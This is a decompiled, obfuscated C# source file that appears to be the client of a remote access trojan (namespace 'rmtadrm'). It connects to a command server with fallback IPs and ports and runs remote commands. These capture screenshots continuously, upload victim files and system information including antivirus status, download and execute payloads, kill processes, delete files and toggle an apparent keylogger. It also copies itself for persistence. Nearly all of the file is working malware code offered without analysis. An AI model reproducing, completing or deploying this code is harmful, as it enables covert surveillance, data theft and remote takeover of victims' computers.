using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace rmtadrm;

public class wrmstimzMCDM
{
	public NetworkStream wrmstimznetStream;

	private int wrmstimzbuffSize = 1024;

	private wrmstimzDRIVF wrmstimzHD = new wrmstimzDRIVF();

	public bool wrmstimzis_working = false;

	private bool wrmstimziswitch = false;

	public int port_sn = 0;

	private Dictionary<string, byte[]> wrmstimztasks = new Dictionary<string, byte[]>();

	public DateTime wrmstimzrunTime;

	private int wrmstimzbytesRead = 0;

	public bool wrmstimzreqCnls = false;

	private int wrmstimzatmps = 0;

	public bool wrmstimzautCnls = false;

	public DateTime wrmstimzlTimeUtc;

	private wrmstimzTHRE wrmstimzStateObj = new wrmstimzTHRE();

	private wrmstimzMYINF wrmstimzUPC;

	private wrmstimzOCMD wrmstimzCMD;

	private int wrmstimzscrSize = 200;

	private ThreadStart wrmstimzfunStarter;

	public TcpClient wrmstimztcpsck;

	private bool wrmstimzthrRuning = false;

	private int wrmstimzthreadCnts = 0;

	private bool wrmstimzstr_writer = false;

	private bool wrmstimzcapScreen = false;

	private Thread wrmstimzfunThread;

	public void wrmstimzdo_start()
	{
		wrmstimzCONF.wrmstimzport = wrmstimzCONF.ports[0];
		wrmstimzrunTime = DateTime.Now;
		wrmstimzUPC = new wrmstimzMYINF();
		wrmstimzCMD = new wrmstimzOCMD(this);
		wrmstimzHD.iserver = this;
		TimerCallback callback = wrmstimzlookup_connect;
		Timer wrmstimztimer = new Timer(callback, wrmstimzStateObj, 32110, 36110);
		wrmstimzStateObj.wrmstimztimer = wrmstimztimer;
	}

	private void wrmstimzcheckLastatime(DateTime mTimeUtc)
	{
		try
		{
			int num = Math.Abs(wrmstimzrunTime.Subtract(mTimeUtc).Minutes);
			if (num > 5)
			{
				wrmstimztcpsck.Close();
				wrmstimzis_working = false;
			}
		}
		catch
		{
		}
	}

	public void wrmstimzsaveFile(string filePath, string run)
	{
		try
		{
			byte[] array = wrmstimzpull_data();
			if (array != null)
			{
				File.WriteAllBytes(filePath, array);
				if (run == "run")
				{
					wrmstimzCMD.wrmstimzdo_process(filePath, null, sendExp: true);
				}
			}
		}
		catch
		{
		}
	}

	public string wrmstimzfile_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|wrmstimz".Split(new char[1] { '|' })[0] : "<|wrmstimz".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|wrmstimz".Split(new char[1] { '|' })[0] : "<|wrmstimz".Split(new char[1] { '|' })[0]);
			text = text + wrmstimzget_size(fileInfo.Length) + ((!ret) ? ">|wrmstimz".Split(new char[1] { '|' })[0] : "<|wrmstimz".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				wrmstimzpush_data(null, "wrmstimz-filsz=|wrmstimz".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	private void wrmstimzlookup_connect(object source)
	{
		try
		{
			if (!wrmstimzthrRuning)
			{
				wrmstimzthrRuning = true;
				wrmstimzcheckLastatime(DateTime.Now);
				if (!wrmstimzis_working || !wrmstimztcpsck.Connected)
				{
					wrmstimzis_working = wrmstimzIPSConfig();
					if (wrmstimzis_working)
					{
						wrmstimzbuffSize = wrmstimztcpsck.ReceiveBufferSize;
						if (wrmstimzfunThread != null && wrmstimzfunThread.IsAlive)
						{
							wrmstimzfunThread.Abort();
						}
						wrmstimzHD.wrmstimzmainPath = wrmstimzCONF.wrmstimzget_mpath();
						wrmstimzsee_responce();
					}
				}
			}
			else
			{
				wrmstimzthreadCnts++;
			}
			wrmstimzthrRuning = false;
		}
		catch
		{
			wrmstimzatmps++;
			wrmstimzthrRuning = false;
			wrmstimzthreadCnts = 0;
			wrmstimzstr_writer = false;
			wrmstimzis_working = false;
			wrmstimziswitch = false;
		}
	}

	private bool wrmstimzIPSConfig()
	{
		try
		{
			wrmstimzCONF.wrmstimzdefaultP = wrmstimzCMD.wrmstimzserverIPD()[0];
			if (wrmstimzatmps > 20)
			{
				wrmstimzCONF.wrmstimzdefaultP = wrmstimzCMD.wrmstimzserverIPD()[1];
				if (wrmstimzatmps > 34)
				{
					wrmstimzatmps = 0;
				}
			}
			wrmstimzatmps++;
			wrmstimztcpsck = new TcpClient();
			wrmstimztcpsck.Connect(wrmstimzCONF.wrmstimzdefaultP, wrmstimzCONF.wrmstimzport);
			return true;
		}
		catch
		{
			wrmstimzports_switch();
			return false;
		}
	}

	public void wrmstimzports_switch()
	{
		try
		{
			port_sn++;
			wrmstimzCONF.wrmstimzport = wrmstimzCONF.ports[port_sn];
			if (port_sn >= wrmstimzCONF.ports.Length - 1)
			{
				port_sn = 0;
			}
		}
		catch
		{
			port_sn = 0;
		}
	}

	public bool wrmstimzsend_auto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">" + fileName;
				wrmstimzpush_data(data, "wrmstimz-afile=" + fileinfo);
				return false;
			}
			wrmstimzpush_data(null, "wrmstimz-anfod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void wrmstimzlist_processes()
	{
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Expected O, but got Unknown
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				long num = 0L;
				string text2 = "";
				try
				{
					PerformanceCounter val = new PerformanceCounter("Process|wrmstimz".Split(new char[1] { '|' })[0], "Working Set - Private|wrmstimz".Split(new char[1] { '|' })[0], processes[i].ProcessName);
					num = val.get_RawValue() / 1024L;
					FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(processes[i].MainModule!.FileName);
					text2 = versionInfo.FileDescription;
				}
				catch
				{
				}
				text = text + processes[i].Id + ">|wrmstimz".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName + ">|wrmstimz".Split(new char[1] { '|' })[0];
				text = text + num + ">|wrmstimz".Split(new char[1] { '|' })[0];
				text = text + text2 + "<";
			}
			if (text == "")
			{
				text = "No-Access!> > > <|wrmstimz".Split(new char[1] { '|' })[0];
			}
			byte[] bytes = Encoding.UTF8.GetBytes(text);
			wrmstimzpush_data(bytes, "wrmstimz-procl=process|wrmstimz".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void wrmstimzload_app()
	{
		try
		{
			string executablePath = Application.get_ExecutablePath();
			string text = wrmstimzCONF.wrmstimzget_mpath() + wrmstimzCONF.wrmstimzmainApp + ".exe|wrmstimz".Split(new char[1] { '|' })[0];
			if (text != executablePath)
			{
				File.WriteAllBytes(text, File.ReadAllBytes(executablePath));
			}
			Thread.Sleep(10);
			wrmstimzCONF.wrmstimzset_run("mrodr|wrmstimz".Split(new char[1] { '|' })[0], wrmstimzCONF.wrmstimzget_mpath() + wrmstimzCONF.wrmstimzmainApp + ".exe|wrmstimz".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void wrmstimzimage_info(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">|wrmstimz".Split(new char[1] { '|' })[0];
				text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|wrmstimz".Split(new char[1] { '|' })[0];
				text = text + wrmstimzget_size(fileInfo.Length) + ">";
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
				wrmstimzpush_data(memoryStream.ToArray(), "wrmstimz-thumb=|wrmstimz".Split(new char[1] { '|' })[0] + text);
			}
		}
		catch
		{
		}
	}

	private void wrmstimzsee_scren(string screenSize)
	{
		try
		{
			wrmstimzSCRNS wrmstimzSCRNS2 = new wrmstimzSCRNS();
			wrmstimzscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			Bitmap val = wrmstimzSCRNS2.wrmstimzscreen(wrmstimzscrSize);
			if (val != null)
			{
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				wrmstimzpush_data(memoryStream.ToArray(), "wrmstimz-sascr=capScreen|wrmstimz".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private void wrmstimzupdate_task(string type)
	{
		try
		{
			if (wrmstimztasks.ContainsKey(type))
			{
				wrmstimztasks.Remove(type);
			}
		}
		catch
		{
		}
	}

	private void wrmstimzis_screen(string screenSize)
	{
		try
		{
			wrmstimzSCRNS wrmstimzSCRNS2 = new wrmstimzSCRNS();
			wrmstimzscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			while (wrmstimzcapScreen && wrmstimzis_working)
			{
				Bitmap val = wrmstimzSCRNS2.wrmstimzscreen(wrmstimzscrSize);
				if (val != null)
				{
					MemoryStream memoryStream = new MemoryStream();
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					wrmstimzpush_data(memoryStream.ToArray(), "wrmstimz-scren=capScreen|wrmstimz".Split(new char[1] { '|' })[0]);
				}
			}
		}
		catch
		{
		}
	}

	private void wrmstimzuser_info()
	{
		string text = wrmstimzUPC.wrmstimzlancard + "|" + wrmstimzUPC.wrmstimzcname + "|" + wrmstimzUPC.wrmstimzuname + "|" + wrmstimzUPC.wrmstimzuip + "|" + wrmstimzCONF.wrmstimzOsname() + "|" + wrmstimzUPC.wrmstimzapver + "|" + wrmstimzCONF.wrmstimzloadAV();
		text += "| !wrmstimz".Split(new char[1] { '!' })[0];
		text = text + "|" + wrmstimzUPC.wrmstimzclientNum;
		text = text + "|" + wrmstimzCONF.wrmstimzget_mpath();
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		wrmstimzpush_data(bytes, "wrmstimz-info=user|wrmstimz".Split(new char[1] { '|' })[0]);
	}

	private void wrmstimzscreenSize(string scSize)
	{
		try
		{
			string[] array = scSize.Split(new char[1] { '>' });
			wrmstimzscrSize = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	private void wrmstimzpush_file(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				if (fileName != "")
				{
					string type = "wrmstimz-file=|wrmstimz".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName;
					wrmstimzpush_data(File.ReadAllBytes(lfile), type, tmp: true);
				}
			}
		}
		catch
		{
		}
	}

	public void wrmstimzremove_file(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	private string wrmstimzget_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|wrmstimz".Split(new char[1] { '|' })[0],
				"KB|wrmstimz".Split(new char[1] { '|' })[0],
				"MB|wrmstimz".Split(new char[1] { '|' })[0],
				"GB|wrmstimz".Split(new char[1] { '|' })[0],
				"TB|wrmstimz".Split(new char[1] { '|' })[0],
				"PB|wrmstimz".Split(new char[1] { '|' })[0],
				"EB|wrmstimz".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "";
		}
	}

	public string[] wrmstimzget_command()
	{
		try
		{
			byte[] array = new byte[5];
			wrmstimzbytesRead = wrmstimznetStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= wrmstimzbytesRead)
			{
				int count = ((num3 > wrmstimzbuffSize) ? wrmstimzbuffSize : num3);
				wrmstimzbytesRead = wrmstimznetStream.Read(array2, num2, count);
				num2 += wrmstimzbytesRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == "")
			{
				return null;
			}
			return text.Split(new char[1] { '=' });
		}
		catch
		{
			wrmstimzis_working = false;
			return null;
		}
	}

	public byte[] wrmstimzpull_data()
	{
		try
		{
			wrmstimzrunTime = DateTime.Now;
			int num = 0;
			byte[] array = new byte[5];
			wrmstimzbytesRead = wrmstimznetStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !wrmstimzreqCnls)
			{
				int count = ((num3 > wrmstimzbuffSize) ? wrmstimzbuffSize : num3);
				wrmstimzbytesRead = wrmstimznetStream.Read(array2, num, count);
				num += wrmstimzbytesRead;
				num3 -= wrmstimzbytesRead;
				wrmstimzrunTime = DateTime.Now;
			}
			if (wrmstimzreqCnls)
			{
				wrmstimznetStream.Flush();
				while (wrmstimznetStream.DataAvailable && wrmstimznetStream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			wrmstimzis_working = false;
			return null;
		}
	}

	private void wrmstimzlistDrives()
	{
		string text = wrmstimzHD.wrmstimzlookupDrives();
		wrmstimzpush_data(null, "wrmstimz-dirs=" + text);
	}

	private void wrmstimzsee_responce()
	{
		if (!wrmstimziswitch)
		{
			wrmstimziswitch = true;
			wrmstimznetStream = wrmstimzCMD.wrmstimzNS(wrmstimztcpsck);
			wrmstimzcapScreen = false;
			while (wrmstimzis_working)
			{
				string[] switchType = wrmstimzget_command();
				if (switchType != null)
				{
					wrmstimzreqCnls = false;
					string text = switchType[0].ToLower();
					text = ((text.Split(new char[1] { '-' }).Length <= 1) ? ("wrmstimz-" + text) : ("wrmstimz-" + text.Split(new char[1] { '-' })[1]));
					switch (text)
					{
					case "wrmstimz-procl":
						wrmstimzfunStarter = delegate
						{
							wrmstimzlist_processes();
						};
						wrmstimzfunThread = new Thread(wrmstimzfunStarter);
						wrmstimzfunThread.Start();
						break;
					case "wrmstimz-thumb":
						wrmstimzimage_info(switchType[1]);
						break;
					case "wrmstimz-clping":
						wrmstimzrunTime = DateTime.Now;
						break;
					case "wrmstimz-putsrt":
						wrmstimzload_app();
						break;
					case "wrmstimz-filsz":
						wrmstimzfunStarter = delegate
						{
							wrmstimzfile_info(switchType[1]);
						};
						wrmstimzfunThread = new Thread(wrmstimzfunStarter);
						wrmstimzfunThread.Start();
						break;
					case "wrmstimz-rupth":
						wrmstimzpush_data(null, "wrmstimz-appth=|wrmstimz".Split(new char[1] { '|' })[0] + wrmstimzCONF.wrmstimzget_mpath());
						break;
					case "wrmstimz-dowf":
						wrmstimzsaveFile(switchType[1], "");
						break;
					case "wrmstimz-endpo":
						try
						{
							Thread.Sleep(100);
							try
							{
								Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())).Kill();
							}
							catch
							{
								wrmstimzCMD.wrmstimzdieProcess(Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())));
							}
						}
						catch
						{
						}
						break;
					case "wrmstimz-scrsz":
						wrmstimzscreenSize(switchType[1]);
						break;
					case "wrmstimz-cownar":
						wrmstimzCMD.wrmstimzdo_updated(7, switchType[1]);
						break;
					case "wrmstimz-cscreen":
						wrmstimzsee_scren(switchType[1]);
						break;
					case "wrmstimz-dirs":
						wrmstimzfunThread = new Thread(wrmstimzlistDrives);
						wrmstimzfunThread.Start();
						break;
					case "wrmstimz-stops":
						wrmstimzcapScreen = false;
						break;
					case "wrmstimz-scren":
						wrmstimzcapScreen = true;
						wrmstimzfunStarter = delegate
						{
							wrmstimzis_screen(switchType[1]);
						};
						wrmstimzfunThread = new Thread(wrmstimzfunStarter);
						wrmstimzfunThread.Start();
						break;
					case "wrmstimz-uklog":
						wrmstimzCMD.wrmstimzdo_updated(3, switchType[1]);
						break;
					case "wrmstimz-cnls":
						wrmstimzautCnls = true;
						wrmstimzreqCnls = true;
						wrmstimzcapScreen = false;
						break;
					case "wrmstimz-udlt":
						wrmstimzCMD.wrmstimzremove_user();
						wrmstimztcpsck.Close();
						break;
					case "wrmstimz-delt":
						wrmstimzfunStarter = delegate
						{
							wrmstimzremove_file(switchType[1]);
						};
						wrmstimzfunThread = new Thread(wrmstimzfunStarter);
						wrmstimzfunThread.Start();
						break;
					case "wrmstimz-afile":
						wrmstimzfunStarter = delegate
						{
							wrmstimzsend_auto(switchType[1]);
						};
						wrmstimzfunThread = new Thread(wrmstimzfunStarter);
						wrmstimzfunThread.Start();
						break;
					case "wrmstimz-listf":
						wrmstimzfunStarter = delegate
						{
							wrmstimzHD.wrmstimzlookFiles(switchType[1]);
						};
						wrmstimzfunThread = new Thread(wrmstimzfunStarter);
						wrmstimzfunThread.Start();
						break;
					case "wrmstimz-file":
						wrmstimzfunStarter = delegate
						{
							wrmstimzpush_file(switchType[1]);
						};
						wrmstimzfunThread = new Thread(wrmstimzfunStarter);
						wrmstimzfunThread.Start();
						break;
					case "wrmstimz-info":
						wrmstimzfunThread = new Thread(wrmstimzuser_info);
						wrmstimzfunThread.Start();
						break;
					case "wrmstimz-runf":
					{
						string[] tParms = switchType[1].Split(new char[1] { '>' });
						wrmstimzfunStarter = delegate
						{
							wrmstimzCMD.wrmstimzdo_process(tParms[0], tParms[1], sendExp: true);
						};
						wrmstimzfunThread = new Thread(wrmstimzfunStarter);
						wrmstimzfunThread.Start();
						break;
					}
					case "wrmstimz-fles":
					{
						string files = wrmstimzHD.wrmstimzlookupFiles(switchType[1]);
						if (files != null)
						{
							wrmstimzfunStarter = delegate
							{
								wrmstimzpush_data(null, "wrmstimz-fles=|wrmstimz".Split(new char[1] { '|' })[0] + files);
							};
							wrmstimzfunThread = new Thread(wrmstimzfunStarter);
							wrmstimzfunThread.Start();
						}
						break;
					}
					case "wrmstimz-dowr":
						wrmstimzsaveFile(switchType[1], "run|wrmstimz".Split(new char[1] { '|' })[0]);
						break;
					case "wrmstimz-fldr":
					{
						string Folders = wrmstimzHD.wrmstimzcheckFolders(switchType[1]);
						if (Folders != null)
						{
							wrmstimzfunStarter = delegate
							{
								wrmstimzpush_data(null, "wrmstimz-fldr=|wrmstimz".Split(new char[1] { '|' })[0] + Folders);
							};
							wrmstimzfunThread = new Thread(wrmstimzfunStarter);
							wrmstimzfunThread.Start();
						}
						break;
					}
					}
					continue;
				}
				wrmstimzis_working = false;
				break;
			}
			wrmstimzis_working = false;
			wrmstimzcapScreen = false;
		}
		wrmstimziswitch = false;
	}

	public bool wrmstimzpush_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			wrmstimzrunTime = DateTime.Now;
			if (wrmstimzstr_writer)
			{
				return false;
			}
			wrmstimzstr_writer = true;
			byte[] bytes = Encoding.UTF8.GetBytes(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes2 = BitConverter.GetBytes(bytes.Length);
			byte[] array2 = new byte[num2 + bytes.Length + num];
			bytes2.CopyTo(array2, 0);
			bytes.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + bytes.Length);
				data.CopyTo(array2, 10 + bytes.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !wrmstimzreqCnls)
			{
				int num5 = ((num4 > wrmstimzbuffSize) ? wrmstimzbuffSize : num4);
				wrmstimznetStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
				wrmstimzrunTime = DateTime.Now;
			}
			wrmstimzstr_writer = false;
			if (wrmstimzreqCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			wrmstimzstr_writer = false;
			wrmstimzis_working = false;
			return false;
		}
	}
}
